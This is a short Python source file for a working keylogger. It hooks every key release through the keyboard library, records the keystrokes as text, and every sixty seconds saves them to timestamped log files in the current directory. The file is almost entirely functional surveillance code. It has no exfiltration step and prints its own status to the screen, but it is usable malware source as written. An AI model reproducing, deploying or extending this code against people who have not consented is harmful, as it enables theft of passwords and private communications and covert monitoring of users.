import keyboard
from threading import Timer
from datetime import datetime

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        Invokes everytime a key is pressed and will be linked to the on_release function

        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[Enter]\n"
            elif name == "tab":
                name = "[Tab]\t"
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = "[Backspace] "
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        """Creates a filename to be linked with the start and end times"""
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":","")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved keylogs to {self.filename}.txt")

    def report(self):
        """ This function will be called every self.interval  
            it saves the logs and resets the self.log variable
        """
        
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started Keylogger")
        keyboard.wait('ctrl+c')
        self.report()


if __name__ == "__main__":
    keylogger = Keylogger(interval=60)
    keylogger.start()

